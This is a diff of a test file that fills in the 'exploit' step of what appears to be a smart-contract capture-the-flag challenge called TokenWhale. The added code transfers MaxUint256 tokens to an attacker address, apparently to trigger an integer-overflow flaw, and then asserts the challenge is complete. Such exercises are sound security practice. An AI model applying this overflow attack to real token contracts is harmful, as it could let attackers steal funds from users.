@@ -21,9 +21,9 @@ describe('TokenWhaleChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    const MAX_UINT256 = ethers.constants.MaxUint256;
+
+    await target.transfer(attacker.address, MAX_UINT256);
 
     expect(await target.isComplete()).to.equal(true);
   });
